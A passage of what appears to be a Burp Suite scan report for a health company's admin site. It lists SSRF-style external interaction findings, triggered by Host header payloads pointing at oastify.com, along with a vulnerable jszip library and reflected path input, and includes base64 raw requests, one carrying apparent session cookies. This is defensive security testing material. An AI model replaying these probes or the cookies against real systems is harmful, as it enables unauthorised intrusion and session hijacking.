iBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9Mg0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1513178053248621568</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/jquery.dataTables.min.js]]></path>
    <location><![CDATA[/js/datatables/jquery.dataTables.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>whhbnx8c3ta7vr440bw4l3l6cxir6qxeqde31tpi.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHdoaGJueDhjM3RhN3ZyNDQwYnc0bDNsNmN4aXI2cXhlcWRlMzF0cGkub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 01:01:39.607 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>whhbnx8c3ta7vr440bw4l3l6cxir6qxeqde31tpi.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>115146609488788480</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/jquery.dataTables.min.js]]></path>
    <location><![CDATA[/js/datatables/jquery.dataTables.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>whhbnx8c3ta7vr440bw4l3l6cxir6qxeqde31tpi.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHdoaGJueDhjM3RhN3ZyNDQwYnc0bDNsNmN4aXI2cXhlcWRlMzF0cGkub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 01:01:40.552 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHdoaGJueDhjM3RhN3ZyNDQwYnc0bDNsNmN4aXI2cXhlcWRlMzF0cGkub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncmpnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>3126577577352454144</serialNumber>
    <type>5243008</type>
    <name><![CDATA[Vulnerable JavaScript dependency]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/jszip.min.js]]></path>
    <location><![CDATA[/js/datatables/jszip.min.js]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>
The use of third-party JavaScript libraries can introduce a range of DOM-based vulnerabilities, including some that can be used to hijack user accounts like DOM-XSS. 
</p>

<p>
Common JavaScript libraries typically enjoy the benefit of being heavily audited. This may mean that bugs are quickly identified and patched upstream, resulting in a steady stream of security updates that need to be applied. Although it may be tempting to ignore updates, using a library with missing security patches can make your website exceptionally easy to exploit. Therefore, it's important to ensure that any available security updates are applied promptly. 
</p>
<p>
Some library vulnerabilities expose every application that imports the library, but others only affect applications that use certain library features. Accurately identifying which library vulnerabilities apply to your website can be difficult, so we recommend applying all available security updates regardless.
</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Develop a patch-management strategy to ensure that security updates are promptly applied to all third-party libraries in your application. Also, consider reducing your attack surface by removing any libraries that are no longer in use.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/1104.html">CWE-1104: Use of Unmaintained Third Party Components</a></li><li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9: Using Components with Known Vulnerabilities</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[<p>We observed a vulnerable JavaScript library.</p>
<p>We detected <strong>jszip</strong> version <strong>3.6.0</strong>, which has the following vulnerabilities:</p>
<ul>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23413">CVE-2021-23413</a>: Prototype Pollution<br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-48285">CVE-2022-48285</a>: Santize filenames when files are loaded with loadAsync, to avoid .zip slip. attacks.<br>
</li>
</ul><br>
]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[jszip>.3.6.0]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kYXRhdGFibGVzL2pzemlwLm1pbi5qcyBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgQVdTQUxCPS8wK0cxdkRGWHZZRFRhbzFLRm4wRWpNZzJWdXN0ZXplSHFENmFRQXhFQzVCTUZta2U0bGdLUU9TUlAwN2tDTVNZeDBuK1VzOWJmYXdXeVJGaUxBeXk2Ny9UWGxaZEc4UXhyY0M5Nm5YclpKa3BDTFdlRDhvdG5oV3p6R2E7IEFXU0FMQkNPUlM9LzArRzF2REZYdllEVGFvMUtGbjBFak1nMlZ1c3RlemVIcUQ2YVFBeEVDNUJNRm1rZTRsZ0tRT1NSUDA3a0NNU1l4MG4rVXM5YmZhd1d5UkZpTEF5eTY3L1RYbFpkRzhReHJjQzk2blhyWkprcENMV2VEOG90bmhXenpHYQ0KU2VjLUNoLVVhLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpBY2NlcHQ6ICovKg0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogbm8tY29ycw0KU2VjLUZldGNoLURlc3Q6IHNjcmlwdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9Mg0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8748893442789914624</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/jszip.min.js]]></path>
    <location><![CDATA[/js/datatables/jszip.min.js [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kYXRhdGFibGVzLzBoNjk3ZXRrbmogSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1584428732123419648</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/pdfmake.min.js]]></path>
    <location><![CDATA[/js/datatables/pdfmake.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>wzzb5xqclts7drm4ibe43336ux0rontbmaa0xqlf.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHd6emI1eHFjbHRzN2RybTRpYmU0MzMzNnV4MHJvbnRibWFhMHhxbGYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>178.128.64.126</originIp>
      <time>2024-Dec-15 00:51:15.510 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>wzzb5xqclts7drm4ibe43336ux0rontbmaa0xqlf.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>4554441884230415360</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/pdfmake.min.js]]></path>
    <location><![CDATA[/js/datatables/pdfmake.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>wzzb5xqclts7drm4ibe43336ux0rontbmaa0xqlf.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHd6emI1eHFjbHRzN2RybTRpYmU0MzMzNnV4MHJvbnRibWFhMHhxbGYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:51:16.451 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHd6emI1eHFjbHRzN2RybTRpYmU0MzMzNnV4MHJvbnRibWFhMHhxbGYub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1nb3hnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1051743426863913984</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/responsive.bootstrap4.min.js]]></path>
    <location><![CDATA[/js/datatables/responsive.bootstrap4.min.js [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kYXRhdGFibGVzL24zcWZpZHkzOTggSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>399692291766859776</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/responsive.bootstrap4.min.js]]></path>
    <location><![CDATA[/js/datatables/responsive.bootstrap4.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
